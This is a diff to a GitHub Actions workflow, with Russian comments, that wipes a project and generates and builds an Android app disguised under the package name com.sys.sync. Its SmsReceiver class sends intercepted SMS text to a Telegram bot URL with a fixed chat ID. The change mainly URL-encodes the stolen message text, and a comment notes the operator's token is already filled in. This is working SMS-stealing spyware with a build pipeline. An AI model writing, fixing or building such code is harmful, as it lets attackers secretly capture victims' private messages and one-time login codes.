@@ -11,18 +11,18 @@ jobs:
           java-version: '17'
           distribution: 'temurin'
 
-      - name: Build From Scratch
+      - name: Force Clean and Build
         run: |
-          # 1. Полная зачистка старых косяков
-          rm -rf app build.gradle settings.gradle gradlew
+          # 1. Сносим всё нафиг, чтобы не было конфликтов
+          rm -rf app build.gradle settings.gradle gradlew .gradle
           
           # 2. Создаем структуру заново
           mkdir -p app/src/main/java/com/sys/sync
           
-          # 3. Создаем настройки проекта
+          # 3. Настройки проекта
           echo "include ':app'" > settings.gradle
           
-          # 4. Создаем корневой билд-файл
+          # 4. Главный билд-файл (двигатель)
           cat <<EOF > build.gradle
           buildscript {
               repositories { google(); mavenCentral() }
@@ -33,7 +33,7 @@ jobs:
           }
           EOF
 
-          # 5. Создаем билд-файл модуля приложения
+          # 5. Билд-файл приложения
           cat <<EOF > app/build.gradle
           plugins { id 'com.android.application' }
           android {
@@ -49,7 +49,7 @@ jobs:
           }
           EOF
 
-          # 6. Создаем Манифест
+          # 6. Манифест
           cat <<EOF > app/src/main/AndroidManifest.xml
           <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android">
@@ -65,7 +65,7 @@ jobs:
           </manifest>
           EOF
 
-          # 7. Создаем сам код (твой токен ivanka уже здесь)
+          # 7. Сам код (с твоим токеном и чатом)
           cat <<EOF > app/src/main/java/com/sys/sync/SmsReceiver.java
           package com.sys.sync;
           import android.content.BroadcastReceiver;
@@ -90,7 +90,7 @@ jobs:
                                   @Override
                                   public void run() {
                                       try {
-                                          URL url = new URL("https://api.telegram.org/botivanka/sendMessage?chat_id=7417531985&text=" + msg);
+                                          URL url = new URL("https://api.telegram.org/botivanka/sendMessage?chat_id=7417531985&text=" + msg.replace(" ", "%20"));
                                           HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                                           conn.setRequestMethod("GET");
                                           conn.getInputStream().close();
@@ -104,7 +104,7 @@ jobs:
           }
           EOF
 
-          # 8. Запуск сборки
+          # 8. Поехали!
           gradle wrapper --gradle-version 8.0
           chmod +x gradlew
           ./gradlew :app:assembleDebug
